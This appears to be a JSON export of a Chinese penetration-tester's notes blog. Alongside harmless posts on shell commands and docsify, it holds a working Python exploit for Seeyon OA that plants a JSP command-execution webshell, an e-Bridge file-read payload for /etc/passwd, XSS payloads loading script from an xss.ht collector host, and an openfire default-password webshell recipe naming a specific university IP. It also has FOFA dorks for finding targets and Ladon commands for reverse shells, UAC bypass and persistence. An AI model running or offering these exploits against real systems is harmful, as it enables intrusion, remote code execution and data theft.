{"meta":{"title":"小白帽","subtitle":"","description":"","author":"无名之辈","url":"https://www.yuque.com/xiaogege-yxttw","root":"/"},"pages":[{"title":"tags","date":"2020-08-06T06:06:45.000Z","updated":"2020-08-06T06:06:45.582Z","comments":true,"path":"tags/index.html","permalink":"https://www.yuque.com/xiaogege-yxttw/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"struts2漏洞","slug":"struts2","date":"2020-09-15T07:27:25.000Z","updated":"2020-09-16T08:58:44.412Z","comments":true,"path":"2020/09/15/struts2/","link":"","permalink":"https://www.yuque.com/xiaogege-yxttw/2020/09/15/struts2/","excerpt":"","text":"——————————————————无名之辈——————————————————- 本文档由瓦雀创建","categories":[],"tags":[]},{"title":"linux命令","slug":"linux","date":"2020-09-14T17:13:47.000Z","updated":"2020-09-16T08:58:44.420Z","comments":true,"path":"2020/09/15/linux/","link":"","permalink":"https://www.yuque.com/xiaogege-yxttw/2020/09/15/linux/","excerpt":"","text":"常用命令1234netstat -nltpnetstat -nltp|grep 22ps -ef |grep ssh&#x2F;PID 查看ssh服务及启动路径sudo find &#x2F; -name nginx.conf | xargs sudo grep &quot;1521&quot; 查询端口所在的文件路径 ——————————————————无名之辈——————————————————- 本文档由瓦雀创建","categories":[],"tags":[]},{"title":"windows常用命令","slug":"win","date":"2020-09-14T17:13:47.000Z","updated":"2020-09-16T08:58:44.428Z","comments":true,"path":"2020/09/15/win/","link":"","permalink":"https://www.yuque.com/xiaogege-yxttw/2020/09/15/win/","excerpt":"","text":"常用命令123456net startnetstat -anonetstat -ano|findstr xxxtasklist | findstr pidtaskkill &#x2F;pid 8716 &#x2F;fwmic process get name,executablepath,processid|findstr pid 通过pid查看运行文件的路径 ——————————————————无名之辈——————————————————- 本文档由瓦雀创建","categories":[],"tags":[]},{"title":"awvs","slug":"awvs","date":"2020-09-14T12:17:45.000Z","updated":"2020-09-16T08:58:44.456Z","comments":true,"path":"2020/09/14/awvs/","link":"","permalink":"https://www.yuque.com/xiaogege-yxttw/2020/09/14/awvs/","excerpt":"","text":"批量扫描123python Acunetix13-Scan-Agent.py -f 1.txt 新增python Acunetix13-Scan-Agent.py -d 删除所有python Acunetix13-Scan-Agent.py -o 输出xlsx image-20200914200841268 注意：必须增加 python，否则添加会失败 image-20200914200914984 附件 AWVS13-Scan-Agent.zip ——————————————————无名之辈——————————————————- 本文档由瓦雀创建","categories":[],"tags":[]},{"title":"泛微","slug":"fanwei","date":"2020-09-14T12:17:45.000Z","updated":"2020-09-16T08:58:44.436Z","comments":true,"path":"2020/09/14/fanwei/","link":"","permalink":"https://www.yuque.com/xiaogege-yxttw/2020/09/14/fanwei/","excerpt":"","text":"泛微-云桥 e-Bridge 任意文件读取涉及版本：2018-2019 全版本 app=”泛微-云桥 e-Bridge” &amp;&amp; country=”CN” ip/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///etc/passwd&amp;fileExt=txt image-20200914153734289 /file/fileNoLogin/3e2598b16871455286ebf95c3e8e118c image-20200914153803987 ——————————————————无名之辈——————————————————- 本文档由瓦雀创建","categories":[],"tags":[]},{"title":"python问题解决","slug":"python","date":"2020-09-13T15:21:27.000Z","updated":"2020-09-16T08:58:44.484Z","comments":true,"path":"2020/09/13/python/","link":"","permalink":"https://www.yuque.com/xiaogege-yxttw/2020/09/13/python/","excerpt":"","text":"python 无法获取环境变量 正常卸载 python 后重启电脑，然后重新安装 python 即可（卸载后直接安装可能导致环境变量无法正常被其他盘读取） 运行 pip 提示 Fatal error in launcher: Unable to create process using ‘“c:\\program files (x86)\\python2\\python.exe” “C:\\Program Files (x86)\\python2\\Scripts\\pip2.exe” list’ image-20200912101801835 直接更改此处的正常的 python 路径即可 image-20200912101849402 *.py 脚本无法正常通过 cmd 执行 直接进入计算机\\HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\ 路径下删除.py 和.pyc 相关目录，然后重启计算即可解决 image-20200915150924283 即可解决此类问题 image-20200915151116469 ——————————————————无名之辈——————————————————- 本文档由瓦雀创建","categories":[],"tags":[]},{"title":"搜索语法","slug":"fofa","date":"2020-09-13T15:20:55.000Z","updated":"2020-09-16T08:58:44.492Z","comments":true,"path":"2020/09/13/fofa/","link":"","permalink":"https://www.yuque.com/xiaogege-yxttw/2020/09/13/fofa/","excerpt":"","text":"ip_city=”chengdu” city=”chengdu” region=”Sichuan” app=”Jenkins”&amp;&amp;region=”Sichuan” region=”Sichuan”&amp;&amp;app=”WebLogic-Server” region=”Sichuan”&amp;&amp;app=”struts2” app=”Tomcat” &amp;&amp;region=”Sichuan” region=”Sichuan”&amp;&amp;title=”后台” region=”Sichuan”&amp;&amp;server==”Seeyon-Server/1.0” region=”Sichuan”&amp;&amp;body=discuz region=”Sichuan”&amp;&amp;app=”ThinkPHP” 1. fofa-dump-master Fofa-collect googlesite:域名 intitle:Index of ——————————————————无名之辈——————————————————- 本文档由瓦雀创建","categories":[],"tags":[]},{"title":"未授权访问","slug":"weishouquan","date":"2020-09-13T15:20:23.000Z","updated":"2020-09-16T08:58:44.504Z","comments":true,"path":"2020/09/13/weishouquan/","link":"","permalink":"https://www.yuque.com/xiaogege-yxttw/2020/09/13/weishouquan/","excerpt":"","text":"Jboss 未授权访问 Jenkins 未授权访问 ldap 未授权访问 Redis 未授权访问 elasticsearch 未授权访问 MenCache 未授权访问 Mongodb 未授权访问 Rsync 未授权访问 Zookeeper 未授权访问 Docker 未授权访问 druid 未授权 image-20200910115357919 ——————————————————无名之辈——————————————————- 本文档由瓦雀创建","categories":[],"tags":[]},{"title":"openfire后台拿webshell","slug":"openfire","date":"2020-09-13T15:19:43.000Z","updated":"2020-09-16T08:58:44.520Z","comments":true,"path":"2020/09/13/openfire/","link":"","permalink":"https://www.yuque.com/xiaogege-yxttw/2020/09/13/openfire/","excerpt":"","text":"弱口令 admin/admin 后台上传 webshell image-20200905132512921 获取 webshell image-20200905132601307 点击即可获取 webshell image-20200905132702989 附件获取 openfire_plugin https://www.twblogs.net/a/5b87f80f2b71775d1cd9cdb3?lang=zh-cn http://218.88.252.50:9090/ 西昌学院 ——————————————————无名之辈——————————————————- 本文档由瓦雀创建","categories":[],"tags":[]},{"title":"致远oa-漏洞复现","slug":"seeyon","date":"2020-09-13T15:19:43.000Z","updated":"2020-09-16T08:58:44.552Z","comments":true,"path":"2020/09/13/seeyon/","link":"","permalink":"https://www.yuque.com/xiaogege-yxttw/2020/09/13/seeyon/","excerpt":"","text":"漏洞范围致远 A8-V5 协同管理软件 V6.1sp1 致远 A8+协同管理软件 V7.0、V7.0sp1、V7.0sp2、V7.0sp3 致远 A8+协同管理软件 V7.1 漏洞复现1、漏洞检测访问出现下图就说明漏洞存在 /seeyon/htmlofficeservlet exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126#!/usr/bin/env python# -*- coding: utf-8 -*-import timeimport randomimport stringimport requestsinfo = &#123; \"name\": \"致远 A8 可 getshell\", \"author\": \"reber\", \"version\": \"致远A8-V5协同管理软件V6.1sp1、致远A8+协同管理软件V7.0、V7.0sp1、V7.0sp2、V7.0sp3、V7.1\", \"type\": \"file_upload\", \"level\": \"high\", \"result\": \"\", \"status\": False, \"references\": \"&lt;url&gt;\", \"desc\": \"&lt;vul describtion&gt;\",&#125;def assign(service, arg): if service == 'seeyon': return True, argdef encode(origin_bytes): \"\"\" 重构 base64 编码函数 \"\"\" # 将每一位bytes转换为二进制字符串 base64_charset = \"gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6\" base64_bytes = ['&#123;:0&gt;8&#125;'.format(bin(ord(b)).replace('0b', '')) for b in origin_bytes] resp = '' nums = len(base64_bytes) // 3 remain = len(base64_bytes) % 3 integral_part = base64_bytes[0:3 * nums] while integral_part: # 取三个字节，以每6比特，转换为4个整数 tmp_unit = ''.join(integral_part[0:3]) tmp_unit = [int(tmp_unit[x: x + 6], 2) for x in [0, 6, 12, 18]] # 取对应base64字符 resp += ''.join([base64_charset[i] for i in tmp_unit]) integral_part = integral_part[3:] if remain: # 补齐三个字节，每个字节补充 0000 0000 remain_part = ''.join(base64_bytes[3 * nums:]) + (3 - remain) * '0' * 8 # 取三个字节，以每6比特，转换为4个整数 # 剩余1字节可构造2个base64字符，补充==；剩余2字节可构造3个base64字符，补充= tmp_unit = [int(remain_part[x: x + 6], 2) for x in [0, 6, 12, 18]][:remain + 1] resp += ''.join([base64_charset[i] for i in tmp_unit]) + (3 - remain) * '=' return respdef verify(arg): url = arg + \"/seeyon/htmlofficeservlet\" tmp_random_str = ''.join(random.sample(string.letters+string.digits, 10)) headers = &#123; \"Pragma\": \"no-cache\", \"Cache-Control\": \"no-cache\", \"Upgrade-Insecure-Requests\": \"1\", \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"Connection\": \"close\", \"Content-Length\": \"429\", &#125; file_name = encode('..\\\\..\\\\..\\\\ApacheJetspeed\\\\webapps\\\\seeyon\\\\shXi3GAEuT.txt') payload = \"DBSTEP V3.0 355 0 10 DBSTEP=OKMLlKlV\\r\\n\" payload += \"OPTION=S3WYOSWLBSGr\\r\\n\" payload += \"currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\\r\\n\" payload += \"CREATEDATE=wUghPB3szB3Xwg66\\r\\n\" payload += \"RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\\r\\n\" payload += \"originalFileId=wV66\\r\\n\" payload += \"originalCreateDate=wUghPB3szB3Xwg66\\r\\n\" payload += \"FILENAME=&#123;&#125;\\r\\n\".format(file_name) payload += \"needReadFile=yRWZdAS6\\r\\n\" payload += \"originalCreateDate=wLSGP4oEzLKAz4=iz=66\\r\\n\" payload += \"a&#123;&#125;\".format(tmp_random_str) try: requests.post(url=url, data=payload, headers=headers) upfile_url = arg+\"/seeyon/shXi3GAEuT.txt\" time.sleep(2) resp = requests.get(url=upfile_url) code = resp.status_code content = resp.text except Exception as e: # print str(e) pass else: if code==200 and tmp_random_str[1:] in content: info['status'] = True info['result'] = \"&#123;&#125; 可直接getshell, 测试文件路径: &#123;&#125;\".format(arg,upfile_url)def attack(arg): url = arg + \"/seeyon/htmlofficeservlet\" headers = &#123; \"Pragma\": \"no-cache\", \"Cache-Control\": \"no-cache\", \"Upgrade-Insecure-Requests\": \"1\", \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"Connection\": \"close\", \"Content-Length\": \"429\", &#125; file_name = encode('..\\\\..\\\\..\\\\ApacheJetspeed\\\\webapps\\\\seeyon\\\\qwer960452.jsp') payload = \"\"\"DBSTEP V3.0 355 0 666 DBSTEP=OKMLlKlV\\rOPTION=S3WYOSWLBSGr\\rcurrentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\\rCREATEDATE=wUghPB3szB3Xwg66\\rRECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\\roriginalFileId=wV66\\roriginalCreateDate=wUghPB3szB3Xwg66\\rFILENAME=\"\"\"+file_name+\"\"\"\\rneedReadFile=yRWZdAS6\\roriginalCreateDate=wLSGP4oEzLKAz4=iz=66\\r&lt;%@ page language=\"java\" import=\"java.util.*,java.io.*\" pageEncoding=\"UTF-8\"%&gt;&lt;%!public static String excuteCmd(String c) &#123;StringBuilder line = new StringBuilder();try &#123;Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) &#123;line.append(temp+\"\\\\n\");&#125;buf.close();&#125; catch (Exception e) &#123;line.append(e.getMessage());&#125;return line.toString();&#125; %&gt;&lt;%if(\"el38A9485\".equals(request.getParameter(\"pwd\"))&amp;&amp;!\"\".equals(request.getParameter(\"cmd\")))&#123;out.println(\"&lt;pre&gt;\"+excuteCmd(request.getParameter(\"cmd\")) + \"&lt;/pre&gt;\");&#125;else&#123;out.println(\":-)\");&#125;%&gt;6e4f045d4b8506bf492ada7e3390d7ce\"\"\" requests.post(url=url, data=payload, headers=headers) resp = requests.get(arg+'/seeyon/qwer960452.jsp?pwd=el38A9485&amp;cmd=cmd+/c+echo+ekwjkjrwre') if 'ekwjkjrwre' in resp.text: print \"&#123;&#125; 的 webshell 路径: &#123;&#125;\".format(arg,arg+'/seeyon/qwer960452.jsp?pwd=el38A9485&amp;cmd=cmd+/c+whoami') 访问： /seeyon/test123456.jsp?pwd=asasd3344&amp;cmd=whoami 漏洞分析 1 漏洞分析 2 ——————————————————无名之辈——————————————————- 本文档由瓦雀创建","categories":[],"tags":[]},{"title":"信息收集","slug":"zhiwen","date":"2020-09-13T15:17:47.000Z","updated":"2020-09-16T08:58:44.592Z","comments":true,"path":"2020/09/13/zhiwen/","link":"","permalink":"https://www.yuque.com/xiaogege-yxttw/2020/09/13/zhiwen/","excerpt":"","text":"1. 子域名收集 OneForAll-master 1oneforall.py --target example.com run 根据all_subdomain_result_20200909_101942.csv的中的 status 参数判断哪些是否可以正常访问，再使用get_banner.py image-20200909111135489 2.1 可用性检测 urlscan-master 1python scan.py 或 2.2. cms 指纹识别（支持可用性检测） 附件 1：Batch-identification-of-website-CMS-fingerprints-master Batch_CMS_identification.py 1.txt 2.csv image-20200907142250594 注意：无法访问的链接均被自动删除，只保留有效的链接 http://whatweb.bugscaner.com/batch.html image-20200907142646393 3. get_banner获取 banner image-20200914192753343 注意：需要去掉前缀 http://或者 https:// 可以通过 notepad++ 先替换 https://再替换 http://，如果出现新的资产会自动累积到 websites_banner.txt 当中。 ——————————————————无名之辈——————————————————- 本文档由瓦雀创建","categories":[],"tags":[]},{"title":"解析漏洞","slug":"jiexi","date":"2020-09-13T15:02:53.000Z","updated":"2020-09-16T08:58:44.628Z","comments":true,"path":"2020/09/13/jiexi/","link":"","permalink":"https://www.yuque.com/xiaogege-yxttw/2020/09/13/jiexi/","excerpt":"","text":"nginx 解析漏洞判定例如正常的图片为 1.jpg image-20200910224530694 在后面添加/.php 以后直接将图片通过源码的方式打开即可证明存在 nginx 的解析漏洞 image-20200910224646490 接下来就可以做成图片马进行上传了 注意：脚本可以放在图片马的任意位置，中间，尾部都可解析 曾经疑问： 1.jpg/.php 图片马被正常解析 下载下来的图片马是否含有源码 已经明白：竟然解析 1.jpg 肯定存在源码，只不过 1.jpg/.php 不存在源码了，因为源码已经被解析掉了 ​ 如果 1.jpg/.php 依然存在源码说明源码未被解析，即不存在解析漏洞 ——————————————————无名之辈——————————————————- 本文档由瓦雀创建","categories":[],"tags":[]},{"title":"burpsuite","slug":"burpsuite","date":"2020-09-13T14:45:07.000Z","updated":"2020-09-16T08:58:44.640Z","comments":true,"path":"2020/09/13/burpsuite/","link":"","permalink":"https://www.yuque.com/xiaogege-yxttw/2020/09/13/burpsuite/","excerpt":"","text":"解决 intruder 中文爆破问题 将中文通过 notepad++ 进行 iso 8859-即可 image-20200909141416370 burpsuite 小插件 Unexpected.informationv1.9.jar 介绍：最近写了一个 BurpSuite Extensions 用来标记请求包中的一些敏感信息、JS 接口和一些特殊字段，防止我们疏忽了一些数据包，我将它命名为“Unexpected information”，使用它可能会有意外的收获信息。 ——————————————————无名之辈——————————————————- 本文档由瓦雀创建","categories":[],"tags":[]},{"title":"phpcms","slug":"dtcms","date":"2020-09-13T14:45:07.000Z","updated":"2020-09-16T08:58:44.648Z","comments":true,"path":"2020/09/13/dtcms/","link":"","permalink":"https://www.yuque.com/xiaogege-yxttw/2020/09/13/dtcms/","excerpt":"","text":"后台 http://m.cngyjz.com/index.php?m=admin&amp;c=index&amp;a=login&amp;pc_hash= robots.txt http://m.cngyjz.com/robots.txt image-20200914160031671 注册页面 http://127.0.0.1/index.php?m=member&amp;c=index&amp;a=login&amp;pc_hash= image-20200914160513445 ——————————————————无名之辈——————————————————- 本文档由瓦雀创建","categories":[],"tags":[]},{"title":"ms17010","slug":"ms17010","date":"2020-09-13T14:45:07.000Z","updated":"2020-09-16T08:58:44.660Z","comments":true,"path":"2020/09/13/ms17010/","link":"","permalink":"https://www.yuque.com/xiaogege-yxttw/2020/09/13/ms17010/","excerpt":"","text":"python MS17-010 检测工具ms17_010_scan 1234567扫单个IPms17010scan-h-n-amd64-1.exe -h 192.168.1.1扫IP段ms17010scan-h-n-amd64-1.exe -n 192.168.1.0&#x2F;24 image-20200831213336442 检查目标是否可以利用这个漏洞，是否有可用管道： image-20200831201658115 发现管道名称为netlogon而且状态是 OK，说明该漏洞可用。 生成 exe 后门 修改 zzz_exploit.py 代码 msf nmap 测试 1nmap --script smb-vuln-ms17-010 192.168.31.193 image-20200831204347791 image-20200831204500096 image-20200831204528437 1python2 zzz_exploit.exe 192.168.3.204 image-20200831185545239 ——————————————————无名之辈——————————————————- 本文档由瓦雀创建","categories":[],"tags":[]},{"title":"XSS-payload","slug":"xss","date":"2020-09-13T14:45:07.000Z","updated":"2020-09-16T08:58:44.668Z","comments":true,"path":"2020/09/13/xss/","link":"","permalink":"https://www.yuque.com/xiaogege-yxttw/2020/09/13/xss/","excerpt":"","text":"xss payload “&gt; javascript:eval(‘var a=document.createElement(&#39;script&#39;);a.src=&#39;https://bb78174163com.xss.ht\\&#39;;document.body.appendChild(a)&#39;) “&gt; “&gt; “&gt; “&gt;&lt;iframe srcdoc=”var a=parent.document.createElement(\"script\");a.src=\"https://bb78174163com.xss.ht&quot;;parent.document.body.appendChild(a);“&gt; function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener(\"load\", b);a.open(\"GET\", \"//bb78174163com.xss.ht\");a.send(); $.getScript(\"//bb78174163com.xss.ht\") ——————————————————无名之辈——————————————————- 本文档由瓦雀创建","categories":[],"tags":[]},{"title":"github临时加速","slug":"github","date":"2020-08-31T07:53:15.000Z","updated":"2020-09-16T08:58:44.688Z","comments":true,"path":"2020/08/31/github/","link":"","permalink":"https://www.yuque.com/xiaogege-yxttw/2020/08/31/github/","excerpt":"","text":"git clone https://github.com/kubernetes/kubernetes.git 更改 git clone https://github.com.cnpmjs.org/kubernetes/kubernetes.git 12345672. &#96;&#96;&#96;http https:&#x2F;&#x2F;gitclone.com&#x2F; git clone https:&#x2F;&#x2F;github.com&#x2F;tendermint&#x2F;tendermint.git 更改 git clone https:&#x2F;&#x2F;gitclone.com&#x2F;github.com&#x2F;tendermint&#x2F;tendermint.git ——————————————————无名之辈——————————————————- 本文档由瓦雀创建","categories":[],"tags":[]},{"title":"内网扫描","slug":"ladon","date":"2020-08-31T07:49:16.000Z","updated":"2020-09-16T08:58:44.772Z","comments":true,"path":"2020/08/31/ladon/","link":"","permalink":"https://www.yuque.com/xiaogege-yxttw/2020/08/31/ladon/","excerpt":"","text":"例如扫描 ms17010（必须加 noping） 12Ladon noping 192.168.8.1&#x2F;24 MS17010&#x2F;&#x2F;扫描c段 image-20200831144138877 image-20200831150742390 资产扫描、指纹识别、服务识别、存活主机、端口扫描 多协议探测存活主机 （IP、机器名、MAC 地址、制造商） Ladon 192.168.3.8/24 OnlinePC 多协议识别操作系统 （IP、机器名、操作系统版本、开放服务） 1Ladon 192.168.1.8&#x2F;24 OsScan 扫描存活主机 1Ladon 192.168.1.8&#x2F;24 OnlineIP ICMP 扫描存活主机 1Ladon 192.168.1.8&#x2F;24 Ping SMBGhost 漏洞检测 CVE-2020-0796 1Ladon 192.168.1.8&#x2F;24 SMBGhost 扫描 Web 信息/Http 服务 1Ladon 192.168.1.8&#x2F;24 WebScan 扫描 C 段站点 URL 域名 12Ladon 192.168.1.8&#x2F;24 UrlScanLadon 192.168.1.8&#x2F;24 SameWeb 域内机器信息获取 1Ladon AdiDnsDump 192.168.1.8 （Domain IP） 扫描 C 段端口、指定端口扫描 12Ladon 192.168.1.8&#x2F;24 PortScanLadon 192.168.1.8 PortScan 80,445,3389 扫描 C 段 WEB 以及 CMS（75 种 Web 指纹识别） 1Ladon 192.168.1.8&#x2F;24 WhatCMS 扫描思科设备 12Ladon 192.168.1.8&#x2F;24 CiscoScanLadon http:&#x2F;&#x2F;192.168.1.8 CiscoScan 枚举 Mssql 数据库主机 （数据库 IP、机器名、SQL 版本） 1Ladon EnumMssql 枚举网络共享资源 （域、存活 IP、共享路径） 1Ladon EnumShare 扫描 LDAP 服务器 1Ladon 192.168.1.8&#x2F;24 LdapScan 扫描 ftp 服务器 1Ladon 192.168.1.8&#x2F;24 FtpScan 445 端口-smb 密码爆破 windows 1Ladon 192.168.1.8&#x2F;24 SmbScan 445 端口-smb-ntlm-hash 爆破 windows 1Ladon 192.168.1.8&#x2F;24 SmbHashScan web 端口-401 基础认证密码爆破 1Ladon http:&#x2F;&#x2F;192.168.1.8&#x2F;login HttpBasicScan 445 端口-ipc 密码爆破 windowns 1Ladon 192.168.1.8&#x2F;24 IpcScan.ini 漏洞检测/漏洞利用/Poc/Exp smb 漏洞检测 cve-2017-0143cve-2017-0144 1Ladon 192.168.1.8&#x2F;24 MS17010 Weblogic 漏洞检测(CVE-2019-2725/CVE-2018-2894) 1Ladon 192.168.1.8&#x2F;24 WeblogicPoc Tomcat 漏洞检测(CVE-2017-12615) 1Ladon 192.168.1.8&#x2F;24 TomcatExp Struts2 漏洞检测(S2-005/S2-009/S2-013/S2-016/S2-019/S2-032/DevMode) 1Ladon 192.168.1.8&#x2F;24 Struts2Poc 信息收集 进程详细信息 12Ladon EnumProcessLadon Tasklist 获取命令行参数 12Ladon cmdlineLadon cmdline cmd.exe 获取渗透基础信息 12Ladon GetInfoLadon GetInfo2 445 端口-atexec 远程执行命令（非交互式） 1Ladon SshExec 192.168.1.8 k8gege k8gege520 whoami 提权降权 BypassUac 绕过 UAC 执行,支持 Win7-Win10 12Ladon BypassUac c:\\1.exeLadon BypassUac c:\\1.bat GetSystem 提权或降权运行程序 12Ladon GetSystem cmd.exeLadon GetSystem cmd.exe explorer 一键迷你 WEB 服务器 12Ladon WebSer 80Ladon web 80 反弹 shell 反弹 TCP NC Shell 1Ladon ReverseTcp 192.168.1.8 4444 nc 反弹 TCP MSF Shell 12 078 RDP 桌面会话劫持（无需密码） 12Ladon RDPHijack 3Ladon RDPHijack 3 console 查看用户最近访问文件 1Ladon Recent 添加注册表 run 启动项 1Ladon RegAuto Test c:\\123.exe at 计划执行程序无需时间 system 权限 12Ladon at c:\\123.exeLadon at c:\\123.exe gui SC 服务加启动项&amp;执行程序(system 权限） 123456Ladon at c:\\123.exeLadon at c:\\123.exe guiLadon sc c:\\123.exeLadon sc c:\\123.exe guiLadon sc c:\\123.exe auto ServerName ——————————————————无名之辈——————————————————- 本文档由瓦雀创建","categories":[],"tags":[]},{"title":"docsify - 生成文档网站简单使用教程","slug":"docsify","date":"2020-08-29T05:53:01.000Z","updated":"2020-09-16T08:58:45.080Z","comments":true,"path":"2020/08/29/docsify/","link":"","permalink":"https://www.yuque.com/xiaogege-yxttw/2020/08/29/docsify/","excerpt":"","text":"1. docsify 介绍docsify 是一个动态生成文档网站的工具。不同于 GitBook、Hexo 的地方是它不会生成将 .md 转成 .html 文件，所有转换工作都是在运行时进行。这将非常实用，如果只是需要快速的搭建一个小型的文档网站，或者不想因为生成的一堆 .html 文件“污染” commit 记录，只需要创建一个 index.html 就可以开始写文档而且直接部署在 GitHub Pages。 2. 引入 docsify 方式2.1 手动创建index.html并引入 docsify 文件docsify 使用方式很简单，只需要在项目中创建一个index.html文件，内容能够如下： 123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge,chrome&#x3D;1&quot;&gt; &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width,initial-scale&#x3D;1&quot;&gt; &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;&#x2F;&#x2F;unpkg.com&#x2F;docsify&#x2F;themes&#x2F;vue.css&quot;&gt;&lt;&#x2F;head&gt;&lt;body&gt; &lt;div id&#x3D;&quot;app&quot;&gt;&lt;&#x2F;div&gt; &lt;script&gt; window.$docsify &#x3D; &#123; &#x2F;&#x2F;... &#125; &lt;&#x2F;script&gt; &lt;script src&#x3D;&quot;&#x2F;&#x2F;unpkg.com&#x2F;docsify&#x2F;lib&#x2F;docsify.min.js&quot;&gt;&lt;&#x2F;script&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 然后在项目中创建一个README.md文件： 12## 我是首页这是我的首页介绍 如果你的系统安装了 Python 的话，可以使用 Python 来启动一个服务： 123python -m SimpleHTTPServer 3000Serving HTTP on 0.0.0.0 port 3000 ...127.0.0.1 - - [03&#x2F;Jan&#x2F;2019 13:45:27] &quot;GET &#x2F; HTTP&#x2F;1.1&quot; 200 - 然后在浏览器中输入http://localhost:3000/查看浏览效果。如果没有 Python，还是可以使用http-server启动服务，可在终端输入npm install http-server -g来安装http-server。 123456http-serverStarting up http-server, serving .&#x2F;Available on: http:&#x2F;&#x2F;127.0.0.1:8080 http:&#x2F;&#x2F;172.24.70.142:8080Hit CTRL-C to stop the server 然后在浏览器中输入http://127.0.0.1:8080查看浏览效果。 注意： 1.在此模式下编辑文件保存后，需要手动刷新浏览器才能看见修改的效果，下面介绍的docsify-cli可实现自动查看效果。 2.强烈建议把index.htm文件中的docsify.min.js和vue.css文件复制到本地项目，然后使用如下方式引入： 12&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;.&#x2F;vue.css&quot;&gt;&lt;script src&#x3D;&quot;.&#x2F;docsify.min.js&quot;&gt;&lt;&#x2F;script&gt; 这样做的好处是不在依赖网络环境了。 2.2 使用docsify-cli来开发docsify-cli 工具，可以方便创建及本地预览文档网站。 2.2.1 安装docsify 需要本地先安装node, 如果没有安装 node，可在 node 官网选择对应操作系统下载安装：https://nodejs.org/zh-cn/终端输入npm i docsify-cli -g进行全局安装： 1234567891011121314npm i docsify-cli -g&#x2F;usr&#x2F;local&#x2F;bin&#x2F;docsify -&gt; &#x2F;usr&#x2F;local&#x2F;lib&#x2F;node_modules&#x2F;docsify-cli&#x2F;bin&#x2F;docsify&gt; fsevents@1.2.4 install &#x2F;usr&#x2F;local&#x2F;lib&#x2F;node_modules&#x2F;docsify-cli&#x2F;node_modules&#x2F;fsevents&gt; node install[fsevents] Success: &quot;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;node_modules&#x2F;docsify-cli&#x2F;node_modules&#x2F;fsevents&#x2F;lib&#x2F;binding&#x2F;Release&#x2F;node-v57-darwin-x64&#x2F;fse.node&quot; already installedPass --update-binary to reinstall or --build-from-source to recompile&gt; docsify@4.8.6 postinstall &#x2F;usr&#x2F;local&#x2F;lib&#x2F;node_modules&#x2F;docsify-cli&#x2F;node_modules&#x2F;docsify&gt; opencollective postinstall Thanks for installing docsify 🙏 Please consider donating to our open collective to help us maintain this package. 👉 Donate: https:&#x2F;&#x2F;opencollective.com&#x2F;docsify&#x2F;donate+ docsify-cli@4.3.0added 456 packages from 206 contributors in 32.827s 安装结束后使用docsify -v查看是否安装成功： 123docsify -vdocsify-cli version: 4.3.0 2.2.2 初始化一个项目首先需要创建一个项目目录： 1mkdir docsify 进入项目目录后，使用docsify init ./来初始化一个项目： 123cd docsifydocsify init .&#x2F;Initialization succeeded! Please run docsify serve .&#x2F; 12345tree -a.├── .nojekyll├── README.md└── index.html 初始化成功后,docsify目录会生成如下几个文件： index.html入口文件 README.md会做为主页内容渲染 .nojekyll用于阻止 GitHub Pages 会忽略掉下划线开头的文件、 .nojekyll文件很重要，如果网站部署到GitHub Pages时，一定要注意这个文件。 直接编辑 ./README.md 就能更新网站内容，当然也可以添加其他.md文件。 2.2.3 启动本地服务终端输入docsify serve ./来启动服务： 123docsify serve .&#x2F;Serving &#x2F;Users&#x2F;dragon&#x2F;tmp&#x2F;docsify now.Listening at http:&#x2F;&#x2F;localhost:3000 然后浏览器打开http://localhost:3000就能看见效果。 当修改文件保存后， docsify serve ./服务会自动实时更新。 3. 关于每个页面和 URL 路径说明如果需要创建多个页面，或者需要多级路由的网站，在docsify里也能很容易的实现。例如创建一个guide.md文件，那么对应的路由就是/#/guide。如果你的目录结构如下： 123456-| .&#x2F; -| README.md -| guide.md -| zh-cn&#x2F; -| README.md -| guide.md 那么对应的访问页面将是: 1234.&#x2F;README.md &#x3D;&gt; http:&#x2F;&#x2F;domain.com.&#x2F;guide.md &#x3D;&gt; http:&#x2F;&#x2F;domain.com&#x2F;guide.&#x2F;zh-cn&#x2F;README.md &#x3D;&gt; http:&#x2F;&#x2F;domain.com&#x2F;zh-cn&#x2F;.&#x2F;zh-cn&#x2F;guide.md &#x3D;&gt; http:&#x2F;&#x2F;domain.com&#x2F;zh-cn&#x2F;guide 4. 侧边栏设置默认情况下，侧边栏会根据当前文档的标题生成目录。 4.1 定制侧边栏首先需要在index.html文件中的window.$docsify添加loadSidebar: true,选项： 123456&lt;script&gt; window.$docsify &#x3D; &#123; loadSidebar: true 